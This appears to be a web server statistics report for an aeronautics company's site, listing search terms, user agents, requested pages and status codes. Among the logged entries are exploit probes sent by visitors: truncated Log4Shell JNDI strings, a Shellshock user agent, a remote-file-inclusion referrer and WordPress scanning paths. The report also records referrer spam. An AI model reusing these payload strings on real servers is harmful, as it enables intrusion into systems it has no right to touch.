n	Rq	1	713.598	mentioned
n	Rq	1	713.598	111
n	Rq	1	713.598	over
n	Rq	25	88.002	http://www.gtaeronautics.com/
n	Rq	1	713.598	google.com
n	Rq	1	713.598	fuel
n	Rq	2	713.598	inc
n	Rq	1	713.598	handbag.com
n	Rq	1	713.598	da42
n	Rq	2	226.338	certification
n	Rq	1	713.598	timing
n	Rq	1	713.598	2015
n	Rq	1	713.598	home
n	Rq	1	713.598	aerospacecompanies
n	Rq	1	713.598	anti
n	Rq	1	713.598	ziroli
n	Rq	1	713.598	sketches
n	Rq	5	713.598	purses
n	Rq	1	713.598	downlink
n	Rq	3	713.598	aeronotics
n	Rq	1	713.598	nanotechnology
n	Rq	1	713.598	zephyr
n	Rq	4	713.598	wyoming
n	Rq	2	713.598	technology
n	Rq	3	939.936	companies
n	Rq	1	713.598	muffler
n	Rq	2	713.598	avia
n	Rq	2	713.598	what
n	Rq	145	348.924	valley
n	Rq	1	713.598	microwave
n	Rq	1	713.598	mold
n	Rq	5	452.676	pglm
n	Rq	1	713.598	specialist
n	Rq	23	1062.522	drawing
n	Rq	1	713.598	tool
n	Rq	1	713.598	security
n	Rq	6	226.338	prototypes
n	Rq	1	713.598	giant
n	Rq	1	713.598	powell
n	Rq	8	191.754	aerospace
n	Rq	4	452.676	unmanned
n	Rq	34	540.678	aeronautics
n	Rq	1	713.598	radius
n	Rq	1	713.598	zero
n	Rq	1	713.598	tobbot
n	Rq	2	226.338	job
n	Rq	2	226.338	neverfull
n	Rq	1	713.598	onbordstarter
n	Rq	20	452.676	ca
n	Rq	1	226.338	as
n	Rq	13	870.768	at
n	Rq	5	1166.274	techniques
n	Rq	1	713.598	does
n	Rq	1	713.598	commercial
n	Rq	1	713.598	www.gt
n	Rq	1	713.598	de
n	Rq	1	713.598	co
n	Rq	1	713.598	speedy
n	Rq	1	713.598	rpas
n	Rq	2	226.338	instrument
n	Rq	1	713.598	do
n	Rq	1	713.598	quotation
n	Rq	3	939.936	training
n	Rq	1	713.598	efi
n	Rq	1	713.598	careers
n	Rq	3	939.936	pilot
n	Rq	9	905.352	bandito
n	Rq	4	452.676	quotes
n	Rq	107	452.676	phone
n	Rq	1	713.598	stations
n	Rq	1	713.598	traing
N	*FR	2013	12	19	00	28
N	*LR	2020	10	14	09	11
N	*f	-200Q	s
N	RQ	20	4171274568	www.gtaeronautics.com
N	RQ	3	3361758200	bandito uav
N	RQ	3	3361758200	onboard starter
N	RQ	8	3238065472	at6 texan
N	RQ	1	2552241832	uavs flying over simi valley ca
N	RQ	1	2552241832	gt aeronautics simi valley california
N	RQ	1	2552241832	aeronautical engineer quote
N	RQ	1	2552241832	does aeronautical engineering require drawing?
N	RQ	1	2552241832	how to do gt in engineering drawing
N	RQ	2	2552241832	http://gtaeronautics.com/
N	RQ	1	2552241832	the government college g.t aeronautics
N	RQ	1	2552241832	bme engine
N	RQ	1	2552241832	uas gcs
N	RQ	1	2552241832	http://www.gtaeronautics.com/indnews.html
N	RQ	92	2552241832	semalt.com
N	RQ	1	2552241832	aero iron mentioned nanotechnology hummingbird uav
N	RQ	1	2552241832	basic fiberglass techniques
N	RQ	1	2552241832	http://gtaeronautics.com/indnews.html
N	RQ	1	2552241832	finnemeccia co
N	RQ	2	2552241832	drawing for customer satisfaction
N	RQ	1	2552241832	cheap louis vuitton speedy handbag.com
N	RQ	1	2552241832	at 6
N	RQ	1	2552241832	quotation specialist engineer drawings
N	RQ	1	2552241832	challenge xtreme 111 piece mechanics tool kit
N	RQ	1	2552241832	uav commercial crew stations
N	RQ	1	2552241832	da42 mpp microwave downlink bandwidth
N	RQ	1	2552241832	anti ice de ice qinetiq zephyr
N	RQ	4	2552241832	louis%20vuitton%20fashion%20valley%20phone%20number
N	RQ	1	2552241832	faa uas pilot certification
N	RQ	1	2552241832	any flying crews in gta
N	RQ	1	2552241832	aerospace drawing
N	RQ	1	2552241832	fiber glass molding job
N	RQ	1	2552241832	aircraft design consultant
N	RQ	1	2552241832	www.gt airplane.com
N	RQ	3	2552241832	gt in aeronotics
N	RQ	1	2552241832	tom rullman
N	RQ	1	2552241832	gt aeronautics simi valley ca
N	RQ	1	2552241832	drone base in simi valley
N	RQ	1	2552241832	fiberglass mold making techniques
N	RQ	1	2552241832	rpa instrument qualification faa instrument rating
N	RQ	1	2552241832	extreme bme
N	RQ	1	2552241832	uas faa maintenance
N	RQ	1	2552241832	louis vuitton neverfull
N	RQ	1	2552241832	fiberglass techniques
N	RQ	1	2552241832	aircraft companies in simi valley
N	RQ	1	2552241832	custom fiberglass moldings
N	RQ	11	2552241832	louis vuitton luggage cheap
N	RQ	1	2552241832	anything
N	RQ	1	2552241832	aeronautical engineering sketches
N	RQ	1	2552241832	gtaeronautics.com
N	RQ	1	2552241832	giant scale ziroli at 6
N	RQ	9	2552241832	outlet louis vuitton handbags
N	RQ	1	2552241832	cowling drawing
N	RQ	1	2552241832	mitsubishi zero
N	RQ	1	2552241832	powell wy gt aeronautics
N	RQ	2	2552241832	what is gt in basic engineering drawing
N	RQ	2	2552241832	composite molding
N	RQ	1	2552241832	aeronautics in simi valley and security work
N	RQ	3	2552241832	gt aeronautics llc jobs
N	RQ	1	2552241832	crew flight gta
N	RQ	1	2552241832	110cc engine timing
N	RQ	1	2552241832	aeronautical engineer quotes
N	RQ	2	2552241832	http://www.gtaeronautics.com/compnews.html
N	RQ	4	2552241832	wyoming flight engineers
N	RQ	1	2552241832	a t 6
N	RQ	1	2552241832	gt aeronautics unmanned air
N	RQ	1	2552241832	fia gt composite tooling
N	RQ	1	2552241832	uas pilot certification
N	RQ	1	2552241832	quotes on aeronautical engineers
N	RQ	1	2552241832	payload for diamond northrop twin engie aircraft
N	RQ	7	2552241832	content
N	RQ	1	2552241832	bme 110
N	RQ	1	2552241832	thomas w rullman gt aeronautics
N	RQ	1	2552241832	luggages for sale
N	RQ	2	2552241832	easylifeapp profile
N	RQ	2	2552241832	simi gt
N	RQ	1	2552241832	mq1 design fuel
N	RQ	1	2552241832	airplane as always cia america2009
N	RQ	1	2552241832	eengineer drawing home
N	RQ	1	2552241832	heavy equipment operator jobs
N	RQ	1	2552241832	aero space drone simi valley
N	RQ	1	2552241832	cheap louis vuitton luggage
N	RQ	1	2552241832	2 stroke electric onboard starter
N	RQ	1	2552241832	skyforce observer mk3
N	RQ	1	2552241832	simi valley unmanned aircraft
N	RQ	2	2552241832	granger whitelaw avia
N	RQ	1	2552241832	louis vuitton fashion valley neverfull
N	RQ	1	2552241832	louis vuitton job opportunities
N	RQ	1	2552241832	google.com
N	RQ	1	2552241832	uas operation training method
N	RQ	2	2552241832	wmaid.com explore gtaeronautics.com
N	RQ	1	2552241832	custum muffler 110cc
N	RQ	1	2552241832	glass manufacturing drawings
N	RQ	1	2552241832	electric motors x male uav x sale
N	RQ	1	2552241832	aerospacecompanies in simi valley
N	RQ	1	2552241832	fiberglass molding
N	RQ	2	2552241832	aeronautical technology inc
N	RQ	1	2552241832	taranis ucav
N	RQ	1	2552241832	vegas drone uav show december 2015
N	RQ	1	2552241832	uav companies in simi valley
N	RQ	1	2552241832	unmanned aircraft systems pilot training
N	RQ	2	2552241832	installerex facebook
N	RQ	3	2552241832	texan at6 photos
N	RQ	1	2552241832	aeronautic engineer
N	RQ	30	2552241832	designer handbags outlet sale
N	RQ	1	2552241832	rpas qulificationa traing with faa
N	RQ	1	2552241832	faa uav training
N	RQ	1	2552241832	uav companies simi valley
N	RQ	5	2552241832	louis vuitton purses outlet
N	RQ	1	2552241832	aeronautics
N	RQ	1	2552241832	cheap louis vuitton luggage outlet
N	RQ	1	2552241832	gt aeronautics tomas rullman
N	RQ	1	2552241832	tobbot
N	RQ	1	2552241832	radius tdw efi fuze
N	RQ	8	2552241832	manufacturing equipment store in simi valley
N	RQ	1	2552241832	aeronautic engineer quotes
N	RQ	1	2552241832	onbordstarter
N	RQ	1	2552241832	rotax amphibian unmanned china
N	RQ	1	2552241832	aeronautical engineering quotes
N	RQ	1	2552241832	drawing aircraft engineering
N	RQ	1	2552241832	gt aeronautics careers
N	RQ	1	2552241832	gt aeronautics bandito
N	RQ	1	2552241832	cody wy carbon fiber
N	RQ	7	2428549104	bme extreme
N	RQ	7	2428549104	aerospace engineering drawings
N	RQ	6	1619032736	texan at6
N	RQ	5	1619032736	bandito pglm
N	RQ	9	1495340008	at 6 texan
N	RQ	20	1371647280	gt aeronautics
N	RQ	2	809516368	fiberglass molding techniques
N	RQ	6	809516368	manufacturing aeronautical prototypes
N	RQ	19	809516368	louis vuitton luggage outlet
N	RQ	10	809516368	louis vuitton fashion valley phone
N	RQ	97	809516368	louis vuitton fashion valley phone number
N	RQ	2	809516368	texan at 6
N	RQ	18	809516368	louis vuitton fashion valley ca
N	RQ	14	562130912	aeronautical engineering drawing
N	RQ	25	314745456	http://www.gtaeronautics.com/
B	*f	-40R	r
B	Rb	40898	4.491	Mozilla/5.0 (compatible; bingbot/2.0;  http://www.bing.com/bingbot.htm)
B	Rb	39833	1.710	ZoominfoBot (zoominfobot at zoominfo dot com)
B	Rb	26862	1.322	Mozilla/5.0 (compatible; Googlebot/2.1;  http://www.google.com/bot.html)
B	Rb	18845	1.073	Sogou web spider/4.0( http://www.sogou.com/docs/help/webmasters.htm#07)
B	Rb	18361	2.538	Mozilla/5.0 (compatible; AhrefsBot/7.0;  http://ahrefs.com/robot/)
B	Rb	16265	1.004	Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)
B	Rb	12964	1.427	Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0;  http://www.bing.com/bingbot.htm)
B	Rb	10420	1.452	Mozilla/5.0 (compatible; YandexBot/3.0;  http://yandex.com/bots)
B	Rb	10188	0.725	Mozilla/5.0 (compatible; Baiduspider/2.0;  http://www.baidu.com/search/spider.html)
B	Rb	10092	0.648	Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
B	Rb	8061	0.933	Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)
B	Rb	7462	0.430	Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)
B	Rb	7181	0.210	Mozilla/4.0 (compatible;)
B	Rb	7153	2.165	Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1736.0 Safari/537.36
B	Rb	7100	0.221	Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)
B	Rb	6453	0.323	Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
B	Rb	6164	0.046	Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)
B	Rb	6152	0.363	Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)
B	Rb	6135	0.232	Googlebot-Image/1.0
B	Rb	6079	0.236	Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36
B	Rb	5848	0.274	Sosospider ( http://help.soso.com/webspider.htm)
B	Rb	5436	0.312	Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.2) Gecko/20040804 Netscape/7.2 (ax)
B	Rb	5308	0.134	Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)
B	Rb	5206	0.332	Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)
B	Rb	4875	0.124	Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)
B	Rb	4446	0.182	Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)
B	Rb	4368	0.036	Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)
B	Rb	4312	0.473	Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 BingPreview/1.0b
B	Rb	4114	0.383	Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1;  http://www.google.com/bot.html)
B	Rb	4037	0.141	Mozilla/5.0 (compatible; SeznamBot/3.2;  http://napoveda.seznam.cz/en/seznambot-intro/)
B	Rb	3867	0.492	PRurl
B	Rb	3789	0.153	Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)
B	Rb	3707	0.785	Mozilla/5.0 (Linux; U; Android 8.1.0; zh-CN; EML-AL00 Build/HUAWEIEML-AL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 baidu.sogo.uc.UCBrowser/11.9.4.974 UWS/2.13.1.48 Mobile Safari/537.36 AliApp(DingTalk/4.5.11) com.alibaba.android.rimet/10487439 Channel/227200 language/zh-CN
B	Rb	3595	0.287	Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; InfoPath.2; .NET CLR 2.0.50727; .NET CLR)
B	Rb	3493	0.185	Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php? )
B	Rb	3481	0.127	Mozilla/5.0 (X11; Datanyze; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36
B	Rb	3426	0.194	Mozilla/5.0 (compatible; BLEXBot/1.0;  http://webmeup-crawler.com/)
B	Rb	3206	0.558	Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727; .NET CLR 1.1.4322)
B	Rb	3062	0.081	Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322)
B	Rb	3049	0.042	Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET CLR 1.1.4322)
B	Rb	755035	73.155	[not listed: 21123]
b	*f	-15Q	s
b	lRQq	1	442773	4181885637	166.948	Netscape
b	lRQq	2	2383	4047581856	161.586	Mozilla/109
b	lRQq	2	2782	3800196390	151.710	Mozilla/14
b	lRQq	2	4222	4238634568	169.213	Mozilla/40
b	lRQq	2	199	4171274568	166.524	Mozilla/90
b	lRQq	2	698	4171274568	166.524	Mozilla/91
b	lRQq	2	775	4171274568	166.524	Mozilla/98
b	lRQq	2	1077	4171274568	166.524	Mozilla/99
b	lRQq	2	1063	4171274568	166.524	Mozilla/105
b	lRQq	2	1651	4171274568	166.524	Mozilla/89
b	lRQq	2	1137	4047581840	161.586	Mozilla/53
b	lRQq	2	1697	4047581840	161.586	Mozilla/66
b	lRQq	2	666	4047581840	161.586	Mozilla/7
b	lRQq	2	1151	3923889112	156.648	Mozilla/51
b	lRQq	2	753	3923889112	156.648	Mozilla/25
b	lRQq	2	1249	3923889112	156.648	Mozilla/26
b	lRQq	2	834	3923889112	156.648	Mozilla/41
b	lRQq	2	480	3800196384	151.710	Mozilla/18
b	lRQq	2	529	3800196384	151.710	Mozilla/48
b	lRQq	2	1453	3676503656	146.772	Mozilla/22
b	lRQq	2	1991	3676503656	146.772	Mozilla/24
b	lRQq	1	325	3991249115	159.337	curl
b	lRQq	2	324	1439007283	57.448	curl/7
b	lRQq	1	809	3923889113	156.648	Python-urllib
b	lRQq	2	76	685823641	27.379	Python-urllib/3
b	lRQq	2	728	2428549104	96.952	Python-urllib/2
b	lRQq	2	5	809516368	32.317	Python-urllib/1
b	lRQq	1	39	4238634568	169.213	MobileSafari
b	lRQq	2	3	4171274568	166.524	MobileSafari/602
b	lRQq	2	8	4171274568	166.524	MobileSafari/8614
b	lRQq	2	1	3361758200	134.207	MobileSafari/601
b	lRQq	2	2	809516368	32.317	MobileSafari/9537
b	lRQq	2	6	809516368	32.317	MobileSafari/8612
b	lRQq	2	19	438438184	17.503	MobileSafari/604
b	lRQq	1	232	4171274568	166.524	DomainCrawler
b	lRQq	2	134	2552241832	101.890	DomainCrawler/3
b	lRQq	2	83	809516368	32.317	DomainCrawler/2
b	lRQq	2	15	809516368	32.317	DomainCrawler/1
b	lRQq	1	16	4171274568	166.524	Windows-Media-Player
b	lRQq	2	11	3361758200	134.207	Windows-Media-Player/11
b	lRQq	2	4	2552241832	101.890	Windows-Media-Player/10
b	lRQq	2	1	2552241832	101.890	Windows-Media-Player/9
b	lRQq	1	27	4171274568	166.524	W3C_Validator
b	lRQq	2	27	4171274568	166.524	W3C_Validator/1
b	lRQq	1	204	4171274568	166.524	Dispatch
b	lRQq	2	204	4171274568	166.524	Dispatch/0
b	lRQq	1	160	4171274568	166.524	axios
b	lRQq	2	160	4171274568	166.524	axios/0
b	lRQq	1	16	4171274568	166.524	${${lower:${lower:jndi}}:${lower:rmi}:
b	lRQq	2	6	2552241832	101.890	${${lower:${lower:jndi}}:${lower:rmi}://188
b	lRQq	2	4	2552241832	101.890	${${lower:${lower:jndi}}:${lower:rmi}://144
b	lRQq	2	2	2552241832	101.890	${${lower:${lower:jndi}}:${lower:rmi}://167
b	lRQq	2	4	809516368	32.317	${${lower:${lower:jndi}}:${lower:rmi}://51
b	lRQq	1	4235	4171274568	166.524	msnbot
b	lRQq	2	2837	809516368	32.317	msnbot/2
b	lRQq	2	1397	809516368	32.317	msnbot/1
b	lRQq	1	43	4047581840	161.586	Chrome
b	lRQq	2	2	2552241832	101.890	Chrome/108
b	lRQq	2	2	2552241832	101.890	Chrome/109
b	lRQq	2	4	2552241832	101.890	Chrome/13
b	lRQq	2	12	2552241832	101.890	Chrome/41
b	lRQq	2	1	2552241832	101.890	Chrome/33
b	lRQq	2	2	2552241832	101.890	Chrome/95
b	lRQq	2	3	2552241832	101.890	Chrome/105
b	lRQq	2	1	2552241832	101.890	Chrome/70
b	lRQq	1	2	4047581840	161.586	() { :;}; 
b	lRQq	2	2	4047581840	161.586	() { :;}; /bin/bash
b	lRQq	1	20	3923889112	156.648	com.google.GoogleMobile
b	lRQq	2	3	3361758200	134.207	com.google.GoogleMobile/42
b	lRQq	2	1	2552241832	101.890	com.google.GoogleMobile/72
b	lRQq	2	1	2552241832	101.890	com.google.GoogleMobile/65
b	lRQq	2	3	2552241832	101.890	com.google.GoogleMobile/38
b	lRQq	2	3	2552241832	101.890	com.google.GoogleMobile/60
b	lRQq	2	1	2552241832	101.890	com.google.GoogleMobile/61
b	lRQq	2	2	2552241832	101.890	com.google.GoogleMobile/34
b	lRQq	2	2	809516368	32.317	com.google.GoogleMobile/62
b	lRQq	2	2	809516368	32.317	com.google.GoogleMobile/67
b	lRQq	2	2	809516368	32.317	com.google.GoogleMobile/41
b	lRQq	1	260	3923889112	156.648	AppEngine-Google; ( http:
b	lRQq	2	260	3923889112	156.648	AppEngine-Google; ( http://code
b	lRQq	1	661167	1156927565	46.186	[not listed: 901]
p	*f	0Q	s
p	lR	1	581247	Windows
p	lR	2	76763	Windows NT
p	lR	2	246843	Unknown Windows
p	lR	2	241421	Windows XP
p	lR	2	2221	Windows 95
p	lR	2	407	Windows CE
p	lR	2	2361	Windows 98
p	lR	2	9417	Windows 2000
p	lR	2	384	Windows 3.1
p	lR	2	1430	Windows ME
p	lR	1	105131	Known robots
p	lR	1	254095	OS unknown
p	lR	1	71573	Unix
p	lR	2	70063	Linux
p	lR	2	22	SunOS
p	lR	2	60	BSD
p	lR	2	1425	Other Unix
p	lR	2	3	HP-UX
p	lR	1	98211	Macintosh
p	lR	2	93992	Unknown Macintosh
p	lR	2	3166	Macintosh PowerPC
p	lR	2	1053	Macintosh 68k
p	lR	1	16	WebTV
p	lR	1	13	BeOS
p	lR	1	35	OS/2
p	lR	1	7	Amiga
i	*f	0R	s
i	lRc	1	317859	68.599	/images/
i	lRc	1	632777	20.758	[root directory]
i	lRc	1	109985	0.073	/js/
i	lRc	1	57355	0.068	/css/
i	lRc	1	1018	10.380	/uploads/
i	lRc	1	217	0.121	/dev/
i	lRc	2	24	0.000	/dev/css/
i	lRc	2	46	0.000	/dev/js/
i	lRc	2	81	0.000	/dev/images/
i	lRc	1	865	0.000	/videos/
i	lRc	1	541	0.000	/client/
i	lRc	1	1	0.000	/cgi-bin/
i	lRc	1	1	0.000	/secure/
i	lRc	1	74	0.000	/stats/
r	*FR	2007	12	18	17	11
r	*LR	2023	03	31	21	37
r	*f	0.050000%S	s
r	lRSc	1	29210	28	2.455	/aboutus.html
r	lRSc	1	25198	24	35.359	/compnews.html
r	lRSc	1	20131	24	1.356	/contactus.html
r	lRSc	1	2162	23	2.270	/gt100hl+rpas.html
r	lRSc	1	6761	21	2.012	/gt380+rpas.html
r	lRSc	1	15226	21	1.195	/pna.html
r	lRSc	1	23356	21	3.096	/uasfc.html
r	lRSc	1	19218	20	2.700	/consultinga.html
r	lRSc	1	18530	20	1.801	/cfmt.html
r	lRSc	1	10130	20	1.940	/sru.html
r	lRSc	1	15152	19	1.365	/indevents.html
r	lRSc	1	18422	18	2.268	/cct&m.html
r	lRSc	1	6396	18	1.662	/gt50t+rpas.html
r	lRSc	1	6807	17	1.600	/gt1500+rpas.html
r	lRSc	1	15687	14	1.495	/links.html
r	lRSc	1	13860	13	1.524	/faq.html
r	lRSc	1	16445	10	0.682	/employment.html
r	lRSc	1	10459	7	0.390	/rd.html
r	lRSc	1	27883	5	20.802	/indnews.html
r	lRSc	2	141	0	0.000	/indnews.html?referer=www.clickfind.com.au/wp-login.php
r	lRSc	2	1	0	0.000	/indnews.html?referer=top1.co.pl
r	lRSc	2	1	0	0.000	/indnews.html?referer=www.clickfind.com.au//wp-content/themes/busybee/thumb.php?src=http://blogger.com.opontodaarte.com.br/java.php
r	lRSc	1	117	2	0.423	/uploads/big+horn+basin+drone+festival+event+schedule.pdf
r	lRSc	1	155	1	2.157	/uploads/idrone-pressrelease-powell-version220119.pdf
r	lRSc	1	83	1	7.588	/uploads/droneexpojan2022+(1).pdf
r	lRSc	1	3878	1	0.105	/banditomav.html
r	lRSc	1	99	1	0.000	/uploads/bighornbasindronefestivalflyer-v2-220110.pdf
r	lRSc	1	98	1	3.453	/uploads/2022wydronefestflyer+rev2.pdf
r	lRSc	1	4177	1	0.099	/uavengines.html
r	lRSc	1	3990	1	0.095	/gtatexan.html
r	lRSc	1	3725	1	0.107	/bandituas.html
r	lRSc	1	1	0	0.000	/client/bandito timeline2007.html
r	lRSc	1	2	0	0.000	/client/bandit+timeline2004.html
r	lRSc	1	1	0	0.000	/stats/quick.html
r	lRSc	1	1	0	0.000	/404.htm
r	lRSc	1	12	0	0.000	/client/gta010707002.html
r	lRSc	1	72	0	0.000	/client/bandito+development.html
r	lRSc	1	135	0	0.000	/client/welcome.html
r	lRSc	1	3	0	0.000	/client/gta021305001.html
r	lRSc	1	1	0	0.000	/stats/browserrep.html
r	lRSc	1	741	0	0.000	/gt50t rpas.html
r	lRSc	1	5	0	0.000	/client/gta012405001.html
r	lRSc	1	2	0	0.000	/dev/contactus.html
r	lRSc	1	4	0	0.000	/stats/general.html
r	lRSc	1	1	0	0.000	/stats/dailyrep.html
r	lRSc	1	1	0	0.000	/dev/aboutus.html
r	lRSc	1	18	0	0.000	/client/tacamo+development.html
r	lRSc	1	1	0	0.000	/client/bandit development.html
r	lRSc	1	17	0	0.000	/client/bandit+timeline2008.html
r	lRSc	1	1	0	0.000	/client/bandito+timeline2005.html
r	lRSc	1	23	0	0.000	/client/projectbids.html
r	lRSc	1	1	0	0.000	/stats/host.html
r	lRSc	1	11	0	0.000	/client/rq2+outlaw.html
r	lRSc	1	1	0	0.000	/client/bandit timeline2008.html
r	lRSc	1	20	0	0.000	/client/clientpna.html
r	lRSc	1	15	0	0.000	/client/bandit.html
r	lRSc	1	2	0	0.000	/stats/default.asp
r	lRSc	1	21	0	0.000	/index.htm
r	lRSc	1	1	0	0.000	/cgi-bin/testms.pl
r	lRSc	1	981	0	0.000	/gtamt.html
r	lRSc	1	14	0	0.000	/client/rq1+bandit.html
r	lRSc	1	2253	0	0.000	/gt1500 rpas.html
r	lRSc	1	6	0	0.000	/client/gta021305002.html
r	lRSc	1	4	0	0.000	/client/gta121004001.html
r	lRSc	1	24	0	0.000	/client/tacamo.html
r	lRSc	1	30	0	0.000	/client/mgqgcyat.asp
r	lRSc	1	1	0	0.000	/dev/client.cgi
r	lRSc	1	18702	0	0.000	/default.asp
r	lRSc	1	1666	0	0.000	/gt380 rpas.html
r	lRSc	1	1	0	0.000	/client/bandito+timeline2006.html
r	lRSc	1	16	0	0.000	/client/rq3+bandito.html
r	lRSc	1	1	0	0.000	/dev/uasfc.html
r	lRSc	1	229	0	0.000	/client.cgi
r	lRSc	1	71	0	0.000	/client/bandit+development.html
r	lRSc	1	2	0	0.000	/client/bandito development.html
r	lRSc	1	2	0	0.000	/stats/yearly.html
r	lRSc	1	2	0	0.000	/stats/domain.html
r	lRSc	1	1	0	0.000	/stats/monthly.html
r	lRSc	1	2	0	0.000	/stats/weekly.html
r	lRSc	1	8	0	0.000	/client/gta010707001.html
r	lRSc	1	3749	0	0.000	/bidspridpass.html
r	lRSc	1	6356	0	0.000	/pridpass.html
r	lRSc	1	12	0	0.000	/client/bandito.html
r	lRSc	1	1	0	0.000	/dev/pna.html
r	lRSc	1	1	0	0.000	/client/tacamo development.html
r	lRSc	1	4	0	0.000	/stats/index.htm
r	lRSc	1	4	0	0.000	/stats/nav.html
r	lRSc	1	1	0	0.000	/stats/quarterly.html
r	lRSc	1	2	0	0.000	/stats/directory.html
r	lRSc	1	2	0	0.000	/stats/organisation.html
r	lRSc	1	8	0	0.000	/client/bandito+timeline2007.html
r	lRSc	1	7	0	0.000	/client/bandit+timeline2007.html
r	lRSc	1	1	0	0.000	/dev/pridpass.html
t	*f	0.100000%B	b
t	lRb	1	256518	42.058	.jpg  [JPEG graphics]
t	lRb	1	333090	27.454	.html [Hypertext Markup Language]
t	lRb	1	263488	18.997	[directories]
t	lRb	1	466	4.935	.mp4
t	lRb	1	778	2.269	.wmv
t	lRb	1	87	2.228	.mpg  [MPEG movie]
t	lRb	1	18734	0.959	.asp  [Active Server REQUESTS]
t	lRb	1	61446	0.308	.gif  [GIF graphics]
t	lRb	1	110031	0.263	.js  [JavaScript code]
t	lRb	1	57371	0.233	.css  [Cascading Style Sheets]
t	lRb	1	552	0.210	.pdf  [Adobe Portable Document Format]
t	lRb	1	18132	0.086	[not listed: 6]
z	*FR	2023	02	28	10	28
z	*LR	2023	03	31	23	21
z	ScR	64	0.000	83539	0
z	ScR	0	0.000	0	1b-  10b
z	ScR	0	0.000	0	11b- 100b
z	ScR	72	0.006	84689	101b-  1kb
z	ScR	549	1.400	502604	1kb- 10kb
z	ScR	336	7.071	347916	10kb-100kb
z	ScR	622	58.533	97835	100kb-  1Mb
z	ScR	35	32.990	4045	1Mb- 10Mb
z	ScR	0	0.000	53	10Mb-100Mb
z	ScR	0	0.000	12	100Mb-  1Gb
c	*FR	2014	03	02	13	52
c	*LR	2023	03	31	23	21
c	*f	0R	a
c	R	1034825	200 OK
c	R	7345	206 Partial content
c	R	122	301 Document moved permanently
c	R	77	302 Document found elsewhere
c	R	78523	304 Not modified since last retrieval
c	R	816	400 Bad request
c	R	207	401 Authentication required
c	R	271	403 Access forbidden
c	R	444094	404 Document not found
c	R	1356	405 Method not allowed
c	R	562	406 Document not acceptable to client
c	R	104	416 Requested range not valid
c	R	618	500 Internal server error
c	R	128	501 Request type not supported
I	*FR	2007	12	11	00	52
I	*LR	2023	03	31	23	19
I	*f	-30S	s
I	lRS	1	109119	152	/robots.txt
I	lRS	1	3938	13	/ads.txt
I	lRS	1	606	7	/wp1/wp-includes/wlwmanifest.xml
I	lRS	1	586	7	/shop/wp-includes/wlwmanifest.xml
I	lRS	1	610	7	/web/wp-includes/wlwmanifest.xml
I	lRS	1	2508	7	/xmlrpc.php
I	lRS	1	750	7	/blog/wp-includes/wlwmanifest.xml
I	lRS	1	6611	7	/wp-login.php
I	lRS	1	749	7	/wordpress/wp-includes/wlwmanifest.xml
I	lRS	1	750	7	/wp/wp-includes/wlwmanifest.xml
I	lRS	1	747	7	/cms/wp-includes/wlwmanifest.xml
I	lRS	1	607	7	/test/wp-includes/wlwmanifest.xml
I	lRS	1	750	7	/site/wp-includes/wlwmanifest.xml
I	lRS	1	484	6	/2019/wp-includes/wlwmanifest.xml
I	lRS	1	564	6	/sito/wp-includes/wlwmanifest.xml
I	lRS	1	566	6	/website/wp-includes/wlwmanifest.xml
I	lRS	1	566	6	/news/wp-includes/wlwmanifest.xml
I	lRS	1	567	6	/wp2/wp-includes/wlwmanifest.xml
I	lRS	1	757	5	/wp-includes/wlwmanifest.xml
I	lRS	1	165	5	/2020/wp-includes/wlwmanifest.xml
I	lRS	1	964	4	/sitemap.xml
I	lRS	1	12	4	/download.php
I	lRS	1	54	4	/blog
I	lRS	1	1842	4	/plus/mytag_js.php
I	lRS	1	220	4	/mobile
I	lRS	1	80	4	/backup
